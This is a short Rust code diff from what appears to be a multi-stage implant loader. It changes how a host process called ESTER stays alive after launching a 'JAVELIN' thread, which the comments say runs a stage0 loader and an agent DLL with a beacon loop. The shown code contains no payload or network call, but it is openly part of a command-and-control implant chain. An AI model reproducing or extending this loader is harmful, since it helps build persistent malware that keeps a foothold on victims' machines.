@@ -74,22 +74,20 @@ fn main() {
     match stage_trigger::trigger_javelin() {
         Ok(thread_handle) => {
             debug_print!("[ESTER] Stage 2 triggered successfully");
-            
-            // CRITICAL: We must wait for the JAVELIN thread to complete
-            // If ESTER exits, the thread dies with it!
-            // In production mode, wait indefinitely for JAVELIN to finish
-            // (which means waiting for the entire agent lifecycle)
+
+            // Keep the process alive so JAVELIN → stage0 → agent DLL can run.
+            // We drop the thread handle and sleep forever — the agent's beacon
+            // loop is what actually does I/O; ESTER is just the host process.
             #[cfg(target_os = "windows")]
-            {
-                use winapi::um::synchapi::WaitForSingleObject;
-                use winapi::um::winbase::INFINITE;
-                
-                if !thread_handle.is_null() {
-                    debug_print!("[ESTER] Waiting for JAVELIN thread to complete...");
-                    unsafe {
-                        WaitForSingleObject(thread_handle, INFINITE);
-                    }
+            if !thread_handle.is_null() {
+                unsafe {
+                    use winapi::um::handleapi::CloseHandle;
+                    CloseHandle(thread_handle);
                 }
+            }
+            debug_print!("[ESTER] JAVELIN launched — keeping process alive");
+            loop {
+                thread::sleep(Duration::from_secs(60));
             }
         }
         Err(e) => {
